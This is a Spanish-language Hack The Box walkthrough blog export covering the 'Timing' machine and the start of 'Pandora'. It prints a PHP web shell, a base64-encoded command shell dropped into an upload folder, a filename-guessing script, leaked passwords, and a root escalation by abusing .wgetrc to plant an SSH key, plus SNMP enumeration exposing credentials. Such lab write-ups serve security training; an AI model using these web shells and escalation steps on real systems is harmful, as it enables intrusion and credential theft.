Date: Wed, 26 Jan 2022 22:40:57 GMT π ~/htb/timing ❯ curl -sI http://10.10.11.135 |grep Date Date: Wed, 26 Jan 2022 22:40:58 GMT π ~/htb/timing ❯ Con un pequeño script sincronizamos nuestra hora con la máquina.\n1 2 3 4 5 6 7 8 9 import time, requests, os r = requests.get(\u0026#39;http://10.10.11.135\u0026#39;) time_now = r.headers[\u0026#39;Date\u0026#39;].split(\u0026#39;,\u0026#39;)[1] print(\u0026#34;Date Before: \u0026#34;) os.system(\u0026#39;date\u0026#39;) print(\u0026#34;Date After: \u0026#34;) os.system(f\u0026#39;date -s \u0026#34;{time_now}\u0026#34;\u0026#39;) os.system(\u0026#39;date\u0026#39;) Utilizando PHP, creamos el nombre del archivo cada segundo tomando en cuenta el archivo img.jpg.\n1 2 3 4 5 6 7 8 \u0026lt;?php while(true){ $file_hash = uniqid(); $file_name = md5(\u0026#39;$file_hash\u0026#39; . time()) . \u0026#39;_\u0026#39; . basename(\u0026#39;img.jpg\u0026#39;); echo $file_name; echo(\u0026#34;\\n\u0026#34;); sleep(1); } El contenido del archivo img.jpg.\n1 2 \u0026lt;?php echo(shell_exec($_GET[\u0026#39;cmd\u0026#39;])); Segundos antes de subir el archivo ejecutamos el archivo php creando un pequeño wordlist, luego, subimos el archivo.\n1 2 3 4 5 6 π ~/htb/timing ❯ php archivo.php 75e2a0182352efa4263c33274457c3fd_img.jpg 426d1585cc3cbd6011fec4691e50cab4_img.jpg [...] ^C π ~/htb/timing ❯ php archivo.php \u0026gt; files.txt Tras unos segundo ejecutamos ffuf para buscar nuestro archivo con el wordlist, observamos nuestro archivo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 π ~/htb/timing ❯ ffuf -c -w files.txt -u http://10.10.11.135/images/uploads/FUZZ /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive \u0026lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.11.135/images/uploads/FUZZ :: Wordlist : FUZZ: files.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ 04ddc62cc9d18a54ecec59d5a281193b_img.jpg [Status: 200, Size: 82, Words: 4, Lines: 5] :: Progress: [11/11] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 :: π ~/htb/timing ❯ El archivo existe más no es posible ejecutar comandos.\n1 2 3 4 π ~/htb/timing ❯ curl -s \u0026#34;http://10.10.11.135/images/uploads/04ddc62cc9d18a54ecec59d5a281193b_img.jpg?cmd=id\u0026#34; \u0026lt;?php echo(shell_exec($_GET[\u0026#39;cmd\u0026#39;])); π ~/htb/timing ❯ Si recordamos en image.php fué posible ejecutar login.php. Al pasar nuestro archivo no se muestra el resultado.\n1 2 π ~/htb/timing ❯ curl -s \u0026#34;http://10.10.11.135/image.php?img=images/uploads/04ddc62cc9d18a54ecec59d5a281193b_img.jpg?cmd=id\u0026#34; π ~/htb/timing ❯ Despues de realizar distintas pruebas logramos ejecutar comandos y ver el resultado creando un archivo PHP el cual acepta comandos por medio de solicitudes POST.\n1 2 \u0026lt;?php shell_exec(\u0026#39;echo PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8Ym9keT4KCjxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSI8P3BocCBlY2hvICRfU0VSVkVSWydQSFBfU0VMRiddOz8+Ij4KICBOYW1lOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZm5hbWUiPgogIDxpbnB1dCB0eXBlPSJzdWJtaXQiPgo8L2Zvcm0+Cgo8P3BocAppZiAoJF9TRVJWRVJbIlJFUVVFU1RfTUVUSE9EIl0gPT0gIlBPU1QiKSB7ICAgIAogICAgJG5hbWUgPSBodG1sc3BlY2lhbGNoYXJzKCRfUkVRVUVTVFsnZm5hbWUnXSk7CiAgICBpZiAoZW1wdHkoJG5hbWUpKSB7CiAgICAgICAgZWNobyAiU2VuZCBhIGNvbW1hbmQiOwogICAgfSBlbHNlIHsKICAgICAgICBlY2hvKHN5c3RlbSgkbmFtZSkpOwogICAgfQp9Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K|base64 -d \u0026gt; images/uploads/shell01.php\u0026#39;); Backup Explorando las carpetas de la maquina encontramos un backup en /opt/source-files-backup.zip. Utilizamos netcat para enviar el archivo a nuestra maquina. Vemos que es un \u0026lsquo;backup\u0026rsquo; del repositorio del sitio web, al listar el log vemos dos únicos commits, el último describe una actualización en el archivo db_conn (credenciales y configuración a la base de datos).\n1 2 3 4 5 6 7 8 9 10 11 commit 16de2698b5b122c93461298eab730d00273bd83e (HEAD -\u0026gt; master) Author: grumpy \u0026lt;grumpy@localhost.com\u0026gt; Date: Tue Jul 20 22:34:13 2021 +0000 db_conn updated commit e4e214696159a25c69812571c8214d2bf8736a3f Author: grumpy \u0026lt;grumpy@localhost.com\u0026gt; Date: Tue Jul 20 22:33:54 2021 +0000 init Al mostrar los cambios vemos que la contraseña fue modificada.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 commit 16de2698b5b122c93461298eab730d00273bd83e (HEAD -\u0026gt; master) Author: grumpy \u0026lt;grumpy@localhost.com\u0026gt; Date: Tue Jul 20 22:34:13 2021 +0000 db_conn updated diff --git a/db_conn.php b/db_conn.php index f1c9217..5397ffa 100644 --- a/db_conn.php +++ b/db_conn.php @@ -1,2 +1,2 @@ \u0026lt;?php -$pdo = new PDO(\u0026#39;mysql:host=localhost;dbname=app\u0026#39;, \u0026#39;root\u0026#39;, \u0026#39;S3cr3t_unGu3ss4bl3_p422w0Rd\u0026#39;); +$pdo = new PDO(\u0026#39;mysql:host=localhost;dbname=app\u0026#39;, \u0026#39;root\u0026#39;, \u0026#39;4_V3Ry_l0000n9_p422w0rd\u0026#39;); User - Aaron Utilizamos esta contraseña en el servicio SSH con el usuario Aaron, logrando acceder a la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 π backup master ❯ ssh aaron@10.10.11.135 # S3cr3t_unGu3ss4bl3_p422w0Rd aaron@10.10.11.135\u0026#39;s password: Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Thu Jan 27 01:13:50 UTC 2022 System load: 0.08 Processes: 172 Usage of /: 48.9% of 4.85GB Users logged in: 0 Memory usage: 10% IP address for eth0: 10.10.11.135 Swap usage: 0% 8 updates can be applied immediately. 8 of these updates are standard security updates. To see these additional updates run: apt list --upgradable aaron@timing:~$ ls user.txt aaron@timing:~$ cat user.txt 69635af663ada0f8661f8e88c55f3e9d aaron@timing:~$ Privesc Vemos que el usuario puede ejecutar como root el archivo netutils, este último ejecuta un .jar al cual no tenemos acceso.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 aaron@timing:~$ sudo -l -l Matching Defaults entries for aaron on timing: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User aaron may run the following commands on timing: Sudoers entry: RunAsUsers: ALL Options: !authenticate Commands: /usr/bin/netutils aaron@timing:~$ ls -lah /usr/bin/netutils -rwxr-xr-x 1 root root 42 Oct 5 15:03 /usr/bin/netutils aaron@timing:~$ cat /usr/bin/netutils #! /bin/bash java -jar /root/netutils.jar aaron@timing:~$ Al ejecutar el comando vemos que realiza algun tipo de descarga utilizando los protocolos FTP y HTTP.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 aaron@timing:~$ sudo /usr/bin/netutils netutils v0.1 Select one option: [0] FTP [1] HTTP [2] Quit Input \u0026gt;\u0026gt; 0 Enter Url+File: localhost netutils v0.1 Select one option: [0] FTP [1] HTTP [2] Quit Input \u0026gt;\u0026gt; 1 Enter Url: localhost Initializing download: http://localhost File size: 5609 bytes Opening output file default Starting download [ 0%] ..... Connection 0 finished Downloaded 5.5 Kilobyte in 0 seconds. (54.53 KB/s) netutils v0.1 Select one option: [0] FTP [1] HTTP [2] Quit Input \u0026gt;\u0026gt; 2 aaron@timing:~$ Colocamos a la escucha el puerto 21, vemos que realiza la conexión a nuestra máquina.\n1 2 3 π ~/htb/timing ❯ nc -lvvvp 21 listening on [any] 21 ... connect to [10.10.14.160] from 10.10.11.135 [10.10.11.135] 53220 Por otro lado el puerto 80 muestra el User-Agent : Axel/2.16.1.\n1 2 3 4 5 6 7 8 π ~/htb/timing ❯ nc -lvp 80 listening on [any] 80 ... connect to [10.10.14.160] from 10.10.11.135 [10.10.11.135] 37090 GET / HTTP/1.0 Host: 10.10.14.160 Accept: */* Range: bytes=1- User-Agent: Axel/2.16.1 (Linux) Axel es un acelerador de descargas por medio de la terminal, no se muestra algun tipo de vulnerabilidad o bug que pueda ayudar a escalar privilegios.\n.wgetrc Utilizando pspy logramos ver los comandos que son ejecutados por netutils, vemos a wget con descarga recursiva (-r) por el protocolo FTP y axel por HTTP.\n1 2 3 2022/01/27 01:51:12 CMD: UID=0 PID=11554 | java -jar /root/netutils.jar 2022/01/27 01:51:15 CMD: UID=0 PID=11556 | wget -r ftp://10.10.14.160 2022/01/27 01:51:19 CMD: UID=0 PID=11574 | /root/axel http://10.10.14.160 Creamos un pequeño servidor FTP utilizando pyftpdlib, creamos un archivo dentro de la carpeta temp/.\n1 python3 -m pyftpdlib --directory=temp/ --port=21 --write Tras ejecutar algun comando vemos que se crea una carpeta nueva con todos los archivos que esten dentro del servidor FTP.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 [.. snip ..] Input \u0026gt;\u0026gt; 0 Enter Url+File: 10.10.14.160 netutils v0.1 Select one option: [0] FTP [1] HTTP [2] Quit Input \u0026gt;\u0026gt; 2 aaron@timing:~$ ls 10.10.14.160 ps user.txt aaron@timing:~$ ls -l 10.10.14.160 total 0 -rw-r--r-- 1 root root 0 Jan 27 01:55 file aaron@timing:~$ Intentando pasar alguna flag a las opciones no permite realizar algun cambio en la salida de los archivos.\n1 2 3 4 5 6 aaron@timing:~$ ls \u0026#39;10.10.14.160 -o abc.txt\u0026#39; ps user.txt aaron@timing:~$ ls -l \u0026#39;10.10.14.160 -o abc.txt\u0026#39;/ total 0 -rw-r--r-- 1 root root 0 Jan 27 01:55 file aaron@timing:~$ Investigando acerca de wget encontramos el archivo de configuración .wgetrc. En dicho archivo se encunetran distintos comandos, restricciones y valores que wget utiliza. Utilizamos este archivo para escribir en la carpeta /root/.ssh/ donde vamos a agregar el archivo authorized_keys con la clave publica del usuario aaron, desactivamos backup_converted, tambien, para verificar los cambios y creacion agregamos la opcion logfile.\n1 2 3 4 5 touch ~/.wgetrc echo -n \u0026#34;add_hostdir = off backup_converted = off dir_prefix = /root/.ssh/ logfile = file\u0026#34; \u0026gt; ~/.wgetrc Creamos la clave publica de aaron y la colocamos en el servidor FTP dentro del archivo authorized_keys.\n1 2 3 aaron@timing:~$ cat .ssh/id_rsa.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCm5KcCEy9qx441PIuJ2lqVQK1Gf9lwl9BDk1BF+6uV4zDufo5RoCZUzjgY75rKr7oF2+KMB253nYR0o2Mu99axxjQxSylw+V+beYX7hq/r5mG2KEFNj7VKHb4YRv3uf0awg+VNootnSQ4mOv3d6brQLzr/tYMwqcLirCyltW2o6WIAMu3O7CI23w3Ld0S9XxWSeZGl123fMsqUZfSFrF8qGs8ETlvV91WleXy4N1yjKBjsXf1xngwp0LmGjEwdncxDQwOJaiD4GJMG2z+UlEm07G6M5hvI5x6p+E+ImDN6iYzoZt1QabSNnTe/gLQRNTF/f1LKzz5trRKcMuRNUfDt aaron@timing aaron@timing:~$ Ejecutamos netutils y confirmamos en el archivo file (logfile) que el archivo authorized_keys fue creado.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 aaron@timing:~$ sudo /usr/bin/netutils [.. snip .. ] Enter Url+File: 10.10.14.160 netutils v0.1 Select one option: [0] FTP [1] HTTP [2] Quit Input \u0026gt;\u0026gt; 2 aaron@timing:~$ ls file ps user.txt aaron@timing:~$ cat file --2022-01-27 02:17:21-- ftp://10.10.14.160/ =\u0026gt; ‘/root/.ssh/.listing’ Connecting to 10.10.14.160:21... connected. Logging in as anonymous ... Logged in! ==\u0026gt; SYST ... done. ==\u0026gt; PWD ... done. ==\u0026gt; TYPE I ... done. ==\u0026gt; CWD not needed. ==\u0026gt; PASV ... done. ==\u0026gt; LIST ... done. 0K 96.5K=0.001s 2022-01-27 02:17:22 (96.5 KB/s) - ‘/root/.ssh/.listing’ saved [72] Removed ‘/root/.ssh/.listing’. --2022-01-27 02:17:22-- ftp://10.10.14.160/authorized_keys =\u0026gt; ‘/root/.ssh/authorized_keys’ ==\u0026gt; CWD not required. ==\u0026gt; PASV ... done. ==\u0026gt; RETR authorized_keys ... done. Length: 394 0K 100% 90.0K=0.004s 2022-01-27 02:17:22 (90.0 KB/s) - ‘/root/.ssh/authorized_keys’ saved [394] FINISHED --2022-01-27 02:17:22-- Total wall clock time: 0.9s Downloaded: 1 files, 394 in 0.005s (76.9 KB/s) aaron@timing:~$ Finalmente ingresamos como root por SSH en localhost, logrando obtener la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 aaron@timing:~$ ssh root@localhost The authenticity of host \u0026#39;localhost (127.0.0.1)\u0026#39; can\u0026#39;t be established. ECDSA key fingerprint is SHA256:w5P4pFdNqpvCcxxisM5OCJz7a6chyDUrd1JQ14k5smY. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added \u0026#39;localhost\u0026#39; (ECDSA) to the list of known hosts. Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Thu Jan 27 02:18:50 UTC 2022 System load: 0.01 Processes: 182 Usage of /: 49.1% of 4.85GB Users logged in: 1 Memory usage: 14% IP address for eth0: 10.10.11.135 Swap usage: 0% 8 updates can be applied immediately. 8 of these updates are standard security updates. To see these additional updates run: apt list --upgradable Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Tue Dec 7 12:08:29 2021 root@timing:~# whoami; pwd root /root root@timing:~# ls axel netutils.jar root.txt root@timing:~# cat root.txt ede898fd75c5b2607a180e51ba7e5458 root@timing:~# Netutils.jar Vemos el codigo fuente de netutils.jar.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 // Using JD jar in Main.class import app.Main; import java.io.BufferedReader; import java.io.IOException; import java.io.InputStream; import java.io.InputStreamReader; import java.util.Scanner; public class Main { private static final Scanner sc = new Scanner(System.in); public static void main(String[] args) { while (true) { System.out.println(\u0026#34;netutils v0.1\\nSelect one option:\u0026#34;); System.out.println(\u0026#34;[0] FTP\u0026#34;); System.out.println(\u0026#34;[1] HTTP\u0026#34;); System.out.println(\u0026#34;[2] Quit\u0026#34;); System.out.print(\u0026#34;Input \u0026gt;\u0026gt; \u0026#34;); String input = sc.nextLine(); if (input.equals(\u0026#34;0\u0026#34;)) { System.out.print(\u0026#34;Enter Url+File: \u0026#34;); String url = \u0026#34;ftp://\u0026#34; + sc.nextLine(); System.out.println(run(new String[] { \u0026#34;wget\u0026#34;, \u0026#34;-r\u0026#34;, url })); continue; } if (input.equals(\u0026#34;1\u0026#34;)) { System.out.print(\u0026#34;Enter Url: \u0026#34;); String url = sc.nextLine(); if (!url.matches(\u0026#34;https?://.*\u0026#34;)) url = \u0026#34;http://\u0026#34; + url; System.out.println(run(new String[] { \u0026#34;/root/axel\u0026#34;, url })); continue; } if (input.equals(\u0026#34;2\u0026#34;)) System.exit(0); } } public static String run(String[] args) { try { Process process = Runtime.getRuntime().exec(args); InputStream is = process.getInputStream(); BufferedReader reader = new BufferedReader(new InputStreamReader(is)); StringBuilder sb = new StringBuilder(); String line; while ((line = reader.readLine()) != null) sb.append(line).append(\u0026#34;\\n\u0026#34;); return sb.toString(); } catch (IOException e) { e.printStackTrace(); return \u0026#34;\u0026#34;; } } } ","description":"En Timing encontramos una vulnerabilidad LFI que nos permitió obtener el codigo fuente del sitio web, acceder y escalar privilegios en este, posteriormente acceso por una Web Shell donde encontramos credenciales en un backup del sitio para acceder por SSH. Finalmente escalamos privilegios utilizando el archivo de configuración .wgetrc.","id":26,"section":"posts","tags":["php","lfi","ffuf","wrapper","python","wget","wgetrc","python-ftp","time"],"title":"Hack The Box - Timing","uri":"https://sckull.github.io/posts/timing/"},{"content":"\rPandora expone snmp, servicio por el cual obtuvimos credenciales y acceso por SSH. Encontramos una version de Pandora FMS vulnerable a SQLi, la cual nos permitió obtener privilegios de admin y posteriormente acceso a un segundo usuario. Finalmente escalamos privilegios tras realizar Path Hijacking.\nNombre Pandora OS Linux Puntos 20 Dificultad Facil IP 10.10.11.136 Maker TheCyberGeek dmw0ng Matrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.2, 5.2, 5.6, 4.4, 4.8],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap muestra abierto los puertos: http (80) y ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Nmap 7.91 scan initiated Sun Jan 30 02:46:35 2022 as: nmap -p22,80 -sV -sC -oN nmap_scan 10.10.11.136 Nmap scan report for pandora.htb (10.10.11.136) Host is up (0.071s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA) | 256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA) |_ 256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Play | Landing Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Jan 30 02:46:46 2022 -- 1 IP address (1 host up) scanned in 10.46 seconds Web Site El sitio web parece ser estatico, y muestra una descripcion de una \u0026ldquo;extensión\u0026rdquo; llamada: PLAY.\nExpand me - Full Website\rDirectory Brute Forcing feroxbuster únicamente muestra direcciones de la plantilla del sitio web.\n1 2 3 4 5 6 7 8 9 10 11 12 13 [####################] - 15m 220545/220545 244/s http://pandora.htb/ [\u0026gt;-------------------] - 1m 2635/220545 26/s http://pandora.htb/assets [\u0026gt;-------------------] - 1m 1835/220545 19/s http://pandora.htb/assets/images [\u0026gt;-------------------] - 1m 1959/220545 21/s http://pandora.htb/assets/css [\u0026gt;-------------------] - 1m 1777/220545 19/s http://pandora.htb/assets/images/about [\u0026gt;-------------------] - 1m 1808/220545 19/s http://pandora.htb/assets/images/logo [\u0026gt;-------------------] - 1m 1440/220545 16/s http://pandora.htb/assets/images/banner [\u0026gt;-------------------] - 1m 1366/220545 15/s http://pandora.htb/assets/js [\u0026gt;-------------------] - 1m 1555/220545 18/s http://pandora.htb/assets/images/blog [\u0026gt;-------------------] - 1m 1545/220545 18/s http://pandora.htb/assets/images/testimonials [\u0026gt;-------------------] - 1m 1291/220545 16/s http://pandora.htb/assets/images/footer [\u0026gt;-------------------] - 1m 1115/220545 14/s http://pandora.htb/assets/images/team [\u0026gt;-------------------] - 36s 223/220545 9/s http://pandora.htb/assets/images/404 User - Daniel snmp Tras explorar y jugar con el sitio web no encontramos alguna vulnerabilidad. Realizamos nuevamente un escaneo de puertos esta vez con masscan, el cual nos mostró el puerto 161 udp abierto.\n1 2 3 4 5 6 7 8 π ~/htb/pandora ❯ sudo /usr/bin/masscan -p1-65535,U:1-65535 10.10.11.136 -e tun0 Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-01-30 03:15:12 GMT Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.11.136 Discovered open port 80/tcp on 10.10.11.136 Discovered open port 161/udp on 10.10.11.136 π ~/htb/pandora ❯ El puerto 161/udp pertenece al servicio snmp, verificamos la version utilizando nmap el cual indica v1 y v3.\n1 2 3 4 5 6 7 8 9 10 11 12 π ~/htb/pandora ❯ sudo nmap -sU -sV 10.10.11.136 -p161 Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-30 02:50 UTC Nmap scan report for pandora.htb (10.10.11.136) Host is up (0.071s latency). PORT STATE SERVICE VERSION 161/udp open snmp SNMPv1 server; net-snmp SNMPv3 server (public) Service Info: Host: pandora Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 1.66 seconds π ~/htb/pandora ❯ Antes de ejecutar alguna herramienta realizamos el \u0026lsquo;setup\u0026rsquo; como en Pit - HTB.\nsnmp-check Ejecutamos snmp-check con el \u0026lsquo;community string\u0026rsquo; \u0026ldquo;public\u0026rdquo; y version 1. Vemos informacion de la maquina, procesos, dispositivos, etc.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 π ~/htb/pandora ❯ snmp-check -v 1 -c public 10.10.11.136 snmp-check v1.9 - SNMP enumerator Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org) [+] Try to connect to 10.10.11.136:161 using SNMPv1 and community \u0026#39;public\u0026#39; [*] System information: Host IP address : 10.10.11.136 Hostname : pandora Description : Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 Contact : Daniel Location : Mississippi Uptime snmp : 05:15:39.42 Uptime system : 05:15:28.82 System date : 2022-1-30 02:57:15.0 [*] Network information: IP forwarding enabled : no Default TTL : 64 TCP segments received : 3601010 TCP segments sent : 4101728 TCP segments retrans : 38956 Input datagrams : 3657936 Delivered datagrams : 3657936 Output datagrams : 3569337 [*] Network interfaces: Interface : [ up ] lo Id : 1 Mac Address : ::::: Type : softwareLoopback Speed : 10 Mbps MTU : 65536 In octets : 31804755 Out octets : 31804755 Interface : [ up ] VMware VMXNET3 Ethernet Controller Id : 2 Mac Address : 00:50:56:b9:5a:fe Type : ethernet-csmacd Speed : 4294 Mbps MTU : 1500 In octets : 563888321 Out octets : 2227973757 [*] Network IP: Id IP Address Netmask Broadcast 2 10.10.11.136 255.255.254.0 1 1 127.0.0.1 255.0.0.0 0 [*] Routing information: Destination Next hop Mask Metric 0.0.0.0 10.10.10.2 0.0.0.0 1 10.10.10.0 0.0.0.0 255.255.254.0 0 [*] TCP connections and listening ports: Local address Local port Remote address Remote port State 0.0.0.0 22 0.0.0.0 0 listen 10.10.11.136 22 10.10.14.11 39386 established 10.10.11.136 22 10.10.14.16 54900 timeWait 10.10.11.136 22 10.10.14.16 54902 timeWait 10.10.11.136 22 10.10.14.16 54904 timeWait 10.10.11.136 22 10.10.14.16 54910 timeWait 10.10.11.136 22 10.10.14.16 54912 timeWait 10.10.11.136 35264 1.1.1.1 53 synSent 127.0.0.1 3306 0.0.0.0 0 listen 127.0.0.53 53 0.0.0.0 0 listen [*] Listening UDP ports: Local address Local port 0.0.0.0 161 127.0.0.53 53 [*] Processes: Id Status Name Path Parameters 1 runnable systemd /sbin/init maybe-ubiquity 2 runnable kthreadd 3 unknown rcu_gp 4 unknown rcu_par_gp 6 unknown kworker/0:0H-kblockd [.. snip ..] 768 runnable systemd-logind /lib/systemd/systemd-logind 771 runnable udisksd /usr/lib/udisks2/udisksd 841 runnable cron /usr/sbin/cron -f 843 runnable cron /usr/sbin/CRON -f 851 runnable sh /bin/sh -c sleep 30; /bin/bash -c \u0026#39;/usr/bin/host_check -u daniel -p HotelBabylon23\u0026#39; 866 runnable atd /usr/sbin/atd -f 872 running snmpd /usr/sbin/snmpd -LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid 873 runnable sshd sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 878 runnable apache2 /usr/sbin/apache2 -k start 891 runnable agetty /sbin/agetty -o -p -- \\u --noclear tty1 linux 966 runnable mysqld /usr/sbin/mysqld 980 runnable polkitd /usr/lib/policykit-1/polkitd --no-debug 1216 runnable host_check /usr/bin/host_check -u daniel -p HotelBabylon23 1293 runnable systemd /lib/systemd/systemd --user 1295 runnable (sd-pam) (sd-pam) 16840 runnable gpg-agent /usr/bin/gpg-agent --supervised 27670 runnable sshd sshd: daniel [priv] 27752 runnable sshd sshd: daniel@pts/6 27753 runnable bash -bash 29891 runnable apache2 /usr/sbin/apache2 -k start 30131 runnable apache2 /usr/sbin/apache2 -k start 54083 runnable apache2 /usr/sbin/apache2 -k start 54084 runnable apache2 /usr/sbin/apache2 -k start 64341 runnable gpg-agent gpg-agent --homedir /home/matt/.gnupg --use-standard-socket --daemon 77972 runnable apache2 /usr/sbin/apache2 -k start [.. snip ..] [*] Storage information: Description : [\u0026#34;Physical memory\u0026#34;] Device id : [#\u0026lt;SNMP::Integer:0x000055bb8cd75cd8 @value=1\u0026gt;] Filesystem type : [\u0026#34;unknown\u0026#34;] Device unit : [#\u0026lt;SNMP::Integer:0x000055bb8cd6fe50 @value=1024\u0026gt;] Memory size : 3.84 GB Memory used : 2.23 GB [.. snip ..] Description : [\u0026#34;/run/user/1001\u0026#34;] Device id : [#\u0026lt;SNMP::Integer:0x000055bb8cd10e28 @value=64\u0026gt;] Filesystem type : [\u0026#34;unknown\u0026#34;] Device unit : [#\u0026lt;SNMP::Integer:0x000055bb8cd0f208 @value=4096\u0026gt;] Memory size : 393.61 MB Memory used : 0 bytes [*] File system information: Index : noSuchInstance Mount point : noSuchInstance Access : noSuchInstance Bootable : noSuchInstance [*] Device information: Id Type Status Descr 196608 unknown running GenuineIntel: Intel(R) Xeon(R) Gold 5218 CPU @ 2.30GHz 196609 unknown running GenuineIntel: Intel(R) Xeon(R) Gold 5218 CPU @ 2.30GHz 262145 unknown running network interface lo 262146 unknown running network interface eth0 786432 unknown unknown Guessing that there\u0026#39;s a floating point co-processor [*] Software components: Index Name 1 accountsservice_0.6.55-0ubuntu12~20.04.5_amd64 2 adduser_3.118ubuntu2_all 3 alsa-topology-conf_1.2.2-1_all [.. snip ..] 819 zip_3.0-11build1_amd64 820 zlib1g_1:1.2.11.dfsg-2ubuntu1.2_amd64 π ~/htb/pandora ❯ Observamos en uno de los procesos credenciales que son parametro para un script/comando que parece ser un cronjob.\n1 2 3 4 843 runnable cron /usr/sbin/CRON -f 851 runnable sh /bin/sh -c sleep 30; /bin/bash -c \u0026#39;/usr/bin/host_check -u daniel -p HotelBabylon23\u0026#39; 866 runnable atd /usr/sbin/atd -f 872 running 